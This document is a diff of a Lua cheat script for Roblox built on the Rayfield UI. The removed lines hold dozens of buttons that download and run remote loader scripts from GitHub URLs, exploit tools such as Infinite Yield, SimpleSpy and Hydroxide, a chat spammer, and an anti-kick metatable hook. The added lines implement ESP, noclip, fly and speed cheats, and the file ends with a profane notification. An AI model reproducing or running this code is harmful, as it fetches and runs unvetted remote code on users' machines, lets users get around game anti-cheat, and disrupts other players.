-       RunExternal("Trong", "https://raw.githubusercontent.com/Trong/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Trúc Hub",
-   Callback = function()
-       RunExternal("Truc", "https://raw.githubusercontent.com/Truc/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Tú Hub",
-   Callback = function()
-       RunExternal("Tu", "https://raw.githubusercontent.com/Tu/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Tuấn Hub",
-   Callback = function()
-       RunExternal("Tuan", "https://raw.githubusercontent.com/Tuan/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Tùng Hub",
-   Callback = function()
-       RunExternal("Tung", "https://raw.githubusercontent.com/Tung/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Tuyết Hub",
-   Callback = function()
-       RunExternal("Tuyet", "https://raw.githubusercontent.com/Tuyet/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Uyên Hub",
-   Callback = function()
-       RunExternal("Uyen", "https://raw.githubusercontent.com/Uyen/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Vân Hub",
-   Callback = function()
-       RunExternal("Van", "https://raw.githubusercontent.com/Van/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Việt Hub",
-   Callback = function()
-       RunExternal("Viet", "https://raw.githubusercontent.com/Viet/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Vinh Hub",
-   Callback = function()
-       RunExternal("Vinh", "https://raw.githubusercontent.com/Vinh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Vũ Hub",
-   Callback = function()
-       RunExternal("Vu", "https://raw.githubusercontent.com/Vu/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Vỹ Hub",
-   Callback = function()
-       RunExternal("Vy", "https://raw.githubusercontent.com/Vy/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Xuan Hub",
-   Callback = function()
-       RunExternal("Xuan", "https://raw.githubusercontent.com/Xuan/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Yến Hub",
-   Callback = function()
-       RunExternal("Yen", "https://raw.githubusercontent.com/Yen/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Ân Hub",
-   Callback = function()
-       RunExternal("An", "https://raw.githubusercontent.com/An/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Đạt Hub",
-   Callback = function()
-       RunExternal("Dat", "https://raw.githubusercontent.com/Dat/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Đông Hub",
-   Callback = function()
-       RunExternal("Dong", "https://raw.githubusercontent.com/Dong/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc3:CreateButton({
-   Name = "Đức Hub",
-   Callback = function()
-       RunExternal("Duc", "https://raw.githubusercontent.com/Duc/Hub/main/loader.lua")
-   end,
-})
-local TabMisc4 = Window:CreateTab("Final Scripts", 4483362458)
-
-TabMisc4:CreateButton({
-   Name = "Hùng Hub",
-   Callback = function()
-       RunExternal("Hung", "https://raw.githubusercontent.com/Hung/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Dũng Hub",
-   Callback = function()
-       RunExternal("Dung", "https://raw.githubusercontent.com/Dung/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Quang Hub V2",
-   Callback = function()
-       RunExternal("QuangV2", "https://raw.githubusercontent.com/Quang/HubV2/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Tuấn Hub V3",
-   Callback = function()
-       RunExternal("TuanV3", "https://raw.githubusercontent.com/Tuan/HubV3/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Bách Hub",
-   Callback = function()
-       RunExternal("Bach", "https://raw.githubusercontent.com/Bach/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Thịnh Hub V2",
-   Callback = function()
-       RunExternal("ThinhV2", "https://raw.githubusercontent.com/Thinh/HubV2/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Hoàng Hub",
-   Callback = function()
-       RunExternal("Hoang", "https://raw.githubusercontent.com/Hoang/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Sơn Hub V3",
-   Callback = function()
-       RunExternal("SonV3", "https://raw.githubusercontent.com/SonV3/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Long Hub V2",
-   Callback = function()
-       RunExternal("LongV2", "https://raw.githubusercontent.com/LongV2/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Khánh Hub",
-   Callback = function()
-       RunExternal("Khanh", "https://raw.githubusercontent.com/Khanh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Duy Hub",
-   Callback = function()
-       RunExternal("Duy", "https://raw.githubusercontent.com/Duy/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Anh Hub",
-   Callback = function()
-       RunExternal("Anh", "https://raw.githubusercontent.com/Anh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Bình Hub",
-   Callback = function()
-       RunExternal("Binh", "https://raw.githubusercontent.com/Binh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Hậu Hub",
-   Callback = function()
-       RunExternal("Hau", "https://raw.githubusercontent.com/Hau/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Trực Hub",
-   Callback = function()
-       RunExternal("Truc", "https://raw.githubusercontent.com/Truc/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Sỹ Hub",
-   Callback = function()
-       RunExternal("Sy", "https://raw.githubusercontent.com/Sy/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Tùng Hub V2",
-   Callback = function()
-       RunExternal("TungV2", "https://raw.githubusercontent.com/TungV2/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Hải Hub",
-   Callback = function()
-       RunExternal("Hai", "https://raw.githubusercontent.com/Hai/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Lâm Hub V4",
-   Callback = function()
-       RunExternal("LamV4", "https://raw.githubusercontent.com/LamV4/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Vương Hub Premium",
-   Callback = function()
-       RunExternal("VuongPre", "https://raw.githubusercontent.com/Vuong/Premium/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Hà Hub V2",
-   Callback = function()
-       RunExternal("HaV2", "https://raw.githubusercontent.com/Ha/HubV2/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Nghĩa Hub",
-   Callback = function()
-       RunExternal("Nghia", "https://raw.githubusercontent.com/Nghia/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Kiên Hub",
-   Callback = function()
-       RunExternal("Kien", "https://raw.githubusercontent.com/Kien/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Vinh Hub Pro",
-   Callback = function()
-       RunExternal("VinhPro", "https://raw.githubusercontent.com/Vinh/Pro/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Kha Hub",
-   Callback = function()
-       RunExternal("Kha", "https://raw.githubusercontent.com/Kha/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Phát Hub",
-   Callback = function()
-       RunExternal("Phat", "https://raw.githubusercontent.com/Phat/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Nhật Hub V3",
-   Callback = function()
-       RunExternal("NhatV3", "https://raw.githubusercontent.com/NhatV3/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Toàn Hub",
-   Callback = function()
-       RunExternal("Toan", "https://raw.githubusercontent.com/Toan/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Minh Hub V5",
-   Callback = function()
-       RunExternal("MinhV5", "https://raw.githubusercontent.com/MinhV5/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Tú Hub V2",
-   Callback = function()
-       RunExternal("TuV2", "https://raw.githubusercontent.com/TuV2/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Trung Hub Pro",
-   Callback = function()
-       RunExternal("TrungPro", "https://raw.githubusercontent.com/TrungPro/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Danh Hub",
-   Callback = function()
-       RunExternal("Danh", "https://raw.githubusercontent.com/Danh/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Phước Hub",
-   Callback = function()
-       RunExternal("Phuoc", "https://raw.githubusercontent.com/Phuoc/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Huy Hub V4",
-   Callback = function()
-       RunExternal("HuyV4", "https://raw.githubusercontent.com/HuyV4/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Trọng Hub V2",
-   Callback = function()
-       RunExternal("TrongV2", "https://raw.githubusercontent.com/TrongV2/Hub/main/loader.lua")
-   end,
-})
-
-TabMisc4:CreateButton({
-   Name = "Đức Hub Pro",
-   Callback = function()
-       RunExternal("DucPro", "https://raw.githubusercontent.com/DucPro/Hub/main/loader.lua")
-   end,
-})
-local TabFinalPart = Window:CreateTab("System Final", 4483362458)
-
-TabFinalPart:CreateButton({
-   Name = "FPS Booster V3",
-   Callback = function()
-       local s, e = pcall(function()
-           for _, v in pairs(game:GetDescendants()) do
-               if v:IsA("Part") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
-                   v.Material = Enum.Material.SmoothPlastic
-                   v.Reflectance = 0
-               elseif v:IsA("Decal") or v:IsA("Texture") then
-                   v.Transparency = 1
-               elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
-                   v.Enabled = false
-               end
-           end
-           game:GetService("Lighting").GlobalShadows = false
-           game:GetService("Lighting").FogEnd = 9e9
-           settings().Rendering.QualityLevel = 1
-       end)
-   end,
-})
-
-TabFinalPart:CreateButton({
-   Name = "Memory Cleaner",
-   Callback = function()
-       collectgarbage("collect")
-   end,
-})
-
-TabFinalPart:CreateButton({
-   Name = "Infinite Yield FE",
-   Callback = function()
-       RunExternal("IY", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
-   end,
-})
-
-TabFinalPart:CreateButton({
-   Name = "Chat Spammer",
-   Callback = function()
-       local words = {"Chim To Hub On Top!", "ThaiAn Hub Mega V3", "No Lag Script"}
-       task.spawn(function()
-           while task.wait(3) do
-               game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(words[math.random(1,#words)], "All")
-           end
-       end)
-   end,
-})
-
-TabFinalPart:CreateButton({
-   Name = "Anti-Lag V4",
-   Callback = function()
-       setfpscap(999)
-       local g = game
-       local w = g.Workspace
-       local l = g.Lighting
-       local t = w.Terrain
-       t.WaterWaveSize = 0
-       t.WaterWaveSpeed = 0
-       t.WaterReflectance = 0
-       t.WaterTransparency = 0
-       l.GlobalShadows = false
-       l.FogEnd = 9e9
-       l.Brightness = 0
-       for _, v in pairs(g:GetDescendants()) do
-           if v:IsA("Explosion") then
-               v.Visible = false
-           end
-       end
-   end,
-})
-
-TabFinalPart:CreateButton({
-   Name = "Server Browser",
-   Callback = function()
-       RunExternal("Browser", "https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua")
-   end,
-})
-
-TabFinalPart:CreateButton({
-   Name = "Remote Viewer",
-   Callback = function()
-       RunExternal("Hydro", "https://raw.githubusercontent.com/Upbolt/Hydroxide/revision/init.lua")
-   end,
-})
-
-TabFinalPart:CreateButton({
-   Name = "Force Reset",
-   Callback = function()
-       LP.Character:BreakJoints()
-   end,
-})
-
-TabFinalPart:CreateButton({
-   Name = "Destroy Hub",
-   Callback = function()
-       Rayfield:Destroy()
-   end,
-})
-
-TabFinalPart:CreateSection("Credits")
-
-TabFinalPart:CreateParagraph({
-    Title = "Mega Premium V3",
-    Content = "Combined from 36.txt, 36(1).txt and ThaiAnHub. Complete Part 10/10."
-})
-
-Rayfield:LoadConfiguration()
-local TabDeepOpt = Window:CreateTab("Deep Optimization", 4483362458)
-
-TabDeepOpt:CreateButton({
-   Name = "Clear All Decals",
-   Callback = function()
-       for _, v in pairs(workspace:GetDescendants()) do
-           if v:IsA("Decal") or v:IsA("Texture") then
-               v:Destroy()
-           end
-       end
-   end,
-})
-
-TabDeepOpt:CreateButton({
-   Name = "GPU Turbo Mode",
-   Callback = function()
-       local settings = settings()
-       settings.Rendering.QualityLevel = Enum.QualityLevel.Level01
-       settings.Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level01
-       for _, v in pairs(game:GetDescendants()) do
-           if v:IsA("MeshPart") or v:IsA("Part") then
-               v.Material = Enum.Material.SmoothPlastic
-               v.Reflectance = 0
-           end
-       end
-   end,
-})
-
-TabDeepOpt:CreateButton({
-   Name = "Low Memory Usage",
-   Callback = function()
-       task.spawn(function()
-           while task.wait(30) do
-               collectgarbage("collect")
-               setfpscap(60)
-           end
-       end)
-   end,
-})
-
-TabDeepOpt:CreateButton({
-   Name = "Remove All Particles",
-   Callback = function()
-       for _, v in pairs(workspace:GetDescendants()) do
-           if v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
-               v.Enabled = false
-           end
-       end
-   end,
-})
-
-TabDeepOpt:CreateButton({
-   Name = "Anti-Crash Security",
-   Callback = function()
-       local mt = getrawmetatable(game)
-       local old = mt.__namecall
-       setreadonly(mt, false)
-       mt.__namecall = newcclosure(function(self, ...)
-           local method = getnamecallmethod()
-           if method == "Kick" or method == "Error" then
-               return nil
-           end
-           return old(self, ...)
-       end)
-       setreadonly(mt, true)
-   end,
-})
-
-TabDeepOpt:CreateButton({
-   Name = "Fast Load Assets",
-   Callback = function()
-       game:GetService("ContentProvider"):PreloadAsync({workspace})
-   end,
-})
-
-TabDeepOpt:CreateButton({
-   Name = "Boost Network Ping",
-   Callback = function()
-       settings().Network.IncomingReplicationLag = 0
-   end,
-})
-
-TabDeepOpt:CreateButton({
-   Name = "Disable Shadows",
-   Callback = function()
-       game:GetService("Lighting").GlobalShadows = false
-   end,
-})
-
-TabDeepOpt:CreateButton({
-   Name = "White Screen (AFK Mode)",
-   Callback = function()
-       local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
-       local frame = Instance.new("Frame", gui)
-       frame.Size = UDim2.new(1, 0, 1, 0)
-       frame.BackgroundColor3 = Color3.new(1, 1, 1)
-       frame.Visible = true
-       RunService:Set3dRenderingEnabled(false)
-   end,
-})
-
-TabDeepOpt:CreateButton({
-   Name = "Re-enable Rendering",
-   Callback = function()
-       RunService:Set3dRenderingEnabled(true)
-       if game:GetService("CoreGui"):FindFirstChild("ScreenGui") then
-           game:GetService("CoreGui").ScreenGui:Destroy()
-       end
-   end,
-})
-
-TabDeepOpt:CreateButton({
-   Name = "Auto Update Check",
-   Callback = function()
-       Rayfield:Notify({
-           Title = "Update System",
-           Content = "You are using the latest Mega Premium V3 version.",
-           Duration = 5
-       })
-   end,
-})
+-- Xóa Cache khi Player thoát
+Services.Players.PlayerRemoving:Connect(function(p) if ESP_Cache[p] then ESP_Cache[p].text:Remove(); ESP_Cache[p].hl:Destroy(); ESP_Cache[p] = nil end end)
+
+-- [ GỘP LOOP 2: STEPPED DÀNH CHO MOVEMENT VÀ VẬT LÝ ] --
+Services.RunService.Stepped:Connect(function()
+    pcall(function()
+        if not LP.Character then return end
+        
+        -- Walkspeed / JumpPower
+        local hum = LP.Character:FindFirstChild("Humanoid")
+        if hum then 
+            hum.WalkSpeed = V4.WalkSpeed
+            hum.JumpPower = V4.JumpPower
+            if V4.JumpPower ~= 50 then hum.UseJumpPower = true end
+        end
+        
+        -- Noclip
+        if V4.Noclip then for _,v in ipairs(LP.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end end
+        
+        -- Anti-Fling
+        if V4.AntiFling then
+            for _, p in ipairs(Services.Players:GetPlayers()) do
+                if p ~= LP and p.Character then for _, v in ipairs(p.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide = false end end end
+            end
+        end
+
+        -- Fly Logic (BodyVelocity)
+        local root = LP.Character:FindFirstChild("HumanoidRootPart")
+        if V4.Fly and root then
+            local bv = root:FindFirstChild("V4_BV") or Instance.new("BodyVelocity", root); bv.Name = "V4_BV"; bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+            local bg = root:FindFirstChild("V4_BG") or Instance.new("BodyGyro", root); bg.Name = "V4_BG"; bg.maxTorque = Vector3.new(9e9, 9e9, 9e9); bg.cframe = Camera.CFrame
+            local dir = Vector3.zero
+            if Services.UserInputService:IsKeyDown(Enum.KeyCode.W) then dir += Camera.CFrame.LookVector end
+            if Services.UserInputService:IsKeyDown(Enum.KeyCode.S) then dir -= Camera.CFrame.LookVector end
+            if Services.UserInputService:IsKeyDown(Enum.KeyCode.D) then dir += Camera.CFrame.RightVector end
+            if Services.UserInputService:IsKeyDown(Enum.KeyCode.A) then dir -= Camera.CFrame.RightVector end
+            bv.velocity = dir * V4.FlySpeed
+        else
+            if root then
+                if root:FindFirstChild("V4_BV") then root.V4_BV:Destroy() end
+                if root:FindFirstChild("V4_BG") then root.V4_BG:Destroy() end
+            end
+        end
+    end)
+end)
+
+Rayfield:Notify({Title = "dm lu lon", Content = "chan bố m đê", Duration = 5})
